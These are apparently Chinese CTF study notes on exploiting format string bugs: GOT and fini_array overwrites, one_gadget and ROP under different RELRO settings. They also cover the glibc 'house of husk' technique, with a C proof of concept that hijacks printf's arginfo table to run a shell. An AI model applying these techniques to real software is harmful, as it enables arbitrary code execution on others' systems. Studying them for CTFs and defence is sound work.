# 格式化字符串漏洞

## NULL RELRO防护模式

### 含有后门函数

1. 修改printf_got为后门函数，修改fini_array到main，程序在exit时会返回到main
2. printf("/bin/sh")即可触发漏洞

### 不含有后门函数

1. 泄露栈地址和libc地址，修改fini_array到main
2. 修改返回地址到one_gadget

## 开启RELRO防护模式

泄露栈，libc和elf地址，栈中爆破未初始化栈空间，使得有一个指向ret的栈地址后修改为main重新指向printf写入ROP

## house of husk

### 有效版本

`glibc 2.23 ~ 2.35`

### 原理

`printf`函数直接调用的`__vfprintf_internal`
`__vfprintf_internal`函数在处理带`$`的格式化字符串时会调用`printf_positional`来处理, 当`__printf_function_table != NULL || __printf_modifier_table != NULL || __printf_va_arg_table != NULL`时也会调用`printf_positional`
`printf_positional`会调用`__parse_one_specmb`来解析
`__parse_one_specmb`有如下代码:

```C
if (__builtin_expect(__printf_function_table == NULL, 1) ||
    spec->info.spec > UCHAR_MAX ||
    __printf_arginfo_table[spec->info.spec] == NULL ||
    (int)(spec->ndata_args = (*__printf_arginfo_table[spec->info.spec])(&spec->info, 1, &spec->data_arg_type, &spec->size)) < 0)
```

### 利用思路

1. 修改`printf_function_table`使其不为0
2. 修改`printf_arginfo_table`指向一个伪造的函数列表，并且`printf_arginfo_table['c'] = backdoor`
3. `printf("%c");`即可触发漏洞

### 示例

```C
#include <stdio.h>
#include <stdlib.h>

void backdoor()
{
    system("/bin/sh");
}

int main()
{
    /* 获取地址 */
    size_t libc_base = &system - 0x50d70;
    // p/x &__printf_function_table
    size_t *printf_function_table = libc_base + 0x21c9c8;
    // p/x &__printf_arginfo_table
    size_t *printf_arginfo_table = libc_base + 0x21b8b0;

    // 伪造函数列表
    size_t *fun;
    fun = malloc(0x100);
    fun['d'] = (size_t)backdoor;
    // 触发漏洞条件
    *printf_function_table = 1;
    *printf_arginfo_table = (size_t)fun;

    // attack
    printf("%d", 0x123456);
    return 0;
}
```
